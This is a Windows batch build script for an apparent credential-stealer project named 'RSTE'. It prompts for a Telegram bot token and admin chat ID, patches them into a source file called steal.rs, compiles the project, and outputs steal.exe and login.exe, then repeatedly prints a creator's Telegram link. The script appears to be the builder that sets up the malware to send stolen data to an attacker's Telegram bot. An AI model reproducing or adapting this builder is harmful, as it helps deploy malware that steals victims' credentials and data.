@echo off
setlocal enabledelayedexpansion

echo Building RSTE binaries...
echo.

set /p "TELEGRAM_TOKEN=Enter Telegram Bot Token: "
set /p "ADMIN_CHAT_ID=Enter Admin Chat ID: "

echo.
echo Updating steal.rs with provided credentials...

powershell -Command "(Get-Content 'src\steal.rs') -replace 'const TELEGRAM_TOKEN: &str = \"1234\";', 'const TELEGRAM_TOKEN: &str = \"%TELEGRAM_TOKEN%\";' -replace 'const ADMIN_CHAT_ID: i64 = 123;', 'const ADMIN_CHAT_ID: i64 = %ADMIN_CHAT_ID%;' | Set-Content 'src\steal.rs'"

if %ERRORLEVEL% EQU 0 (
    echo Credentials updated successfully!
    echo.
    echo Building project...
    
    cargo build --release
    if %ERRORLEVEL% EQU 0 (
        echo Build successful!
        
        if not exist "build" mkdir build
        
        copy "target\release\steal.exe" "build\steal.exe" >nul
        copy "target\release\login.exe" "build\login.exe" >nul
        
        echo Binaries copied to build folder:
        echo   - build\steal.exe
        echo   - build\login.exe
        for /L %%i in (1,1,15) do (
            echo created by https://t.me/hellyeahs
        )
    ) else (
        echo Build failed!
    )
) else (
    echo Failed to update credentials!
)

pause
